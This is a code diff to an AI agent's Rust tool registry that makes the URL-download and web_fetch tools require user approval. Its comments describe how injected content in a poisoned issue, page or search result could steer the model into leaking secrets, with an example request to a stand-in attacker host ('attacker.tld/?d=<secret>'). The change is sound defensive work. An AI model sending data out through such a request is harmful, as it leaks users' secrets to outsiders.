@@ -685,7 +685,14 @@ impl ToolRegistry {
                     },
                     "required": ["url"]
                 })),
-                requires_approval: false,
+                // Downloads whatever URL the model supplies. Read-only for
+                // the local filesystem, but the request itself (destination
+                // host + query string) is an exfiltration channel: a model
+                // steered by injected content elsewhere in the conversation
+                // can smuggle data out via `GET https://attacker.tld/?d=...`
+                // regardless of what the response contains. Same reasoning
+                // as `web_fetch` below.
+                requires_approval: true,
             },
         );
 
@@ -785,13 +792,34 @@ impl ToolRegistry {
             },
         );
 
-        // Web fetch tool - retrieve web content
+        // Web fetch tool - retrieve web content.
+        //
+        // requires_approval: true. This is READ-ONLY for the local
+        // filesystem but NOT safe: `web_fetch` performs an HTTP request to
+        // an arbitrary, model-chosen URL, which is a live exfiltration
+        // channel (`GET https://attacker.tld/?d=<secret>`) whether or not
+        // the response body is ever used. Untrusted content ingested by any
+        // other tool earlier in the same turn (a poisoned GitHub issue, web
+        // page, or search result) can steer the model into issuing exactly
+        // this call with no further user interaction. See
+        // `agent::protocol::model_content` for the untrusted-content
+        // envelope that wraps this tool's *output*; the envelope does not
+        // gate the *request*, which is why approval is required here.
+        //
+        // A per-origin allowlist (auto-approve URLs/hosts already seen this
+        // conversation, prompt only for novel origins) was considered and
+        // deliberately not built in this change: it needs session-scoped
+        // state this stateless, `&self`-only registry does not currently
+        // hold, and this exact file already has two other in-flight PRs
+        // against it. Blanket approval is coarser (more prompts on
+        // multi-fetch research turns) but ships now and is closable in a
+        // follow-up without re-litigating the trust taxonomy.
         let webfetch_definition = WebFetchTool::definition();
         tools.insert(
             "web_fetch".to_string(),
             ToolDefinition {
                 tool: webfetch_definition.clone(),
-                requires_approval: false, // Safe read-only operation
+                requires_approval: true,
             },
         );
         tools.insert(
@@ -799,11 +827,13 @@ impl ToolRegistry {
             ToolDefinition {
                 tool: Tool::new("webfetch", webfetch_definition.description.clone())
                     .with_schema(webfetch_definition.input_schema.clone()),
-                requires_approval: false,
+                requires_approval: true,
             },
         );
 
-        // Image reading tool - for vision-capable models
+        // Image reading tool - for vision-capable models. Reads a local
+        // image file; no network request, so (unlike web_fetch/
+        // extract_document above) there is no exfiltration channel here.
         tools.insert(
             "read_image".to_string(),
             ToolDefinition {
